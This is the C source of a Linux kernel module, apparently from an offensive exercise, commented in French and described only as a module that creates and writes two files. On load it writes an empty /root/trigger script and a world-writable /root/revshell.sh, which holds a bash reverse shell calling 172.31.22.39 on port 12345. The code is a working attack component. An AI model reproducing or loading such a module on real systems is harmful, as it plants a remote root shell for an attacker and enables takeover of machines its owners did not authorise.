#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Votre Nom");
MODULE_DESCRIPTION("LKM pour créer et écrire dans deux fichiers.");
MODULE_VERSION("1.0");

static int __init lkm_file_create_init(void) {
    struct file *trigger_file, *revshell_file;
    loff_t pos_trigger = 0, pos_revshell = 0;
    char *trigger_content = "#!/bin/bash\n";
    char *revshell_content = "#!/bin/bash\n/bin/bash -i >& /dev/tcp/172.31.22.39/12345 0>&1\n";
    ssize_t written;

    printk(KERN_INFO "LKM: Initialisation du module.\n");

    // Crée et ouvre le premier fichier
    trigger_file = filp_open("/root/trigger", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (IS_ERR(trigger_file)) {
        printk(KERN_ERR "LKM: Impossible d'ouvrir ou de créer /root/trigger.\n");
        return PTR_ERR(trigger_file);
    }

    // Écrit dans le premier fichier
    written = kernel_write(trigger_file, trigger_content, strlen(trigger_content), &pos_trigger);
    if (written < 0) {
        printk(KERN_ERR "LKM: Échec de l'écriture dans /root/trigger.\n");
        filp_close(trigger_file, NULL);
        return written;
    }
    printk(KERN_INFO "LKM: Écriture réussie dans /root/trigger.\n");
    filp_close(trigger_file, NULL);

    // Crée et ouvre le second fichier
    revshell_file = filp_open("/root/revshell.sh", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (IS_ERR(revshell_file)) {
        printk(KERN_ERR "LKM: Impossible d'ouvrir ou de créer /root/revshell.sh.\n");
        return PTR_ERR(revshell_file);
    }

    // Écrit dans le second fichier
    written = kernel_write(revshell_file, revshell_content, strlen(revshell_content), &pos_revshell);
    if (written < 0) {
        printk(KERN_ERR "LKM: Échec de l'écriture dans /root/revshell.sh.\n");
        filp_close(revshell_file, NULL);
        return written;
    }
    printk(KERN_INFO "LKM: Écriture réussie dans /root/revshell.sh.\n");
    filp_close(revshell_file, NULL);

    return 0;
}

static void __exit lkm_file_create_exit(void) {
    printk(KERN_INFO "LKM: Module retiré.\n");
}

module_init(lkm_file_create_init);
module_exit(lkm_file_create_exit);
